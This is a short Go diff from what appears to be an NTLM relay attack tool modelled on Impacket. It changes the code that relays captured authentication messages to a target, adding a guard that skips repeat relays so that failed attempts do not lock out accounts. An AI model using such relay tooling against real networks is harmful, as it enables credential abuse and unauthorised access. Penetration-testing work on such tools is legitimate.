@@ -369,14 +369,24 @@ func handleAuth(auth AuthResult, cfg *Config) {
 	// Relay Type 3 to target
 	identity := fmt.Sprintf("%s\\%s", domain, user)
 
+	// Lockout guard: if this identity already failed a relay against this
+	// target, do not push another Type 3 into it (each attempt is one failed
+	// logon). Decline the victim instead; the target stays available for
+	// other identities.
+	if cfg.WasRelayTried(target.URL(), identity) {
+		verboseLog("[-] Skipping relay for %s → %s: already tried and failed this run", identity, target.URL())
+		auth.ResultCh <- false
+		return
+	}
+
 	if err := client.SendAuth(type3); err != nil {
 		log.Printf("[-] Authentication relay failed for %s from %s: %v",
 			identity, auth.SourceAddr, err)
-		// In SOCKS mode, don't register attacks — target stays available for other users
-		// Matches Impacket: registerTarget() is NOT called when runSocks is enabled
-		if !cfg.SOCKSEnabled {
-			cfg.RegisterAttack(target, identity, false)
-		}
+		// Record the tried (identity,target) pair so a repeat poll of the same
+		// creds is declined instead of generating another failed logon. This no
+		// longer retires the target (see isTargetDone) — in SOCKS mode too, the
+		// relayed session is dead after SendAuth failure anyway.
+		cfg.RegisterAttack(target, identity, false)
 		auth.ResultCh <- false
 		return
 	}
